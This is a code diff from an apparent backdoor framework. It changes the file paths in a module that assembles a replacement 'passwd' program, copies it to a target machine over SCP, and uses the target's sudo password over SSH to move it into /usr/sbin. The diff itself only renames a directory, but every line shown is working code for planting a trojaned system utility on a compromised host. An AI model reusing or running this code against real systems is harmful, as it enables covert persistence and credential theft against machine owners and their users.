@@ -19,18 +19,18 @@ class Password(Backdoor):
 
 	def do_exploit(self, args):
 		fileLoc = str(self.get_value("file"))
-		toW = "backdoors/auxiliary/password/passwd"
+		toW = "backdoors/auxiliary/__password/passwd"
 		stringToAdd = ""
 		fileToWrite = open(toW, 'w')
 
-		with open ("backdoors/auxiliary/password/pass1", "r") as myfile:
+		with open ("backdoors/auxiliary/__password/pass1", "r") as myfile:
 		    data=myfile.read()
 		data = data[:-1]#remove the last new line character.
 		stringToAdd+=data + fileLoc
-		with open ("backdoors/auxiliary/password/pass2", "r") as myfile:
+		with open ("backdoors/auxiliary/__password/pass2", "r") as myfile:
 		    data=myfile.read()
 		stringToAdd+=data
 		fileToWrite.write(stringToAdd)
 		fileToWrite.close()
-		self.core.curtarget.scpFiles(self, 'backdoors/auxiliary/password/passwd', False)
+		self.core.curtarget.scpFiles(self, 'backdoors/auxiliary/__password/passwd', False)
 		self.core.curtarget.ssh.exec_command("echo " + self.core.curtarget.pword + " | sudo -S mv ~/passwd /usr/sbin")
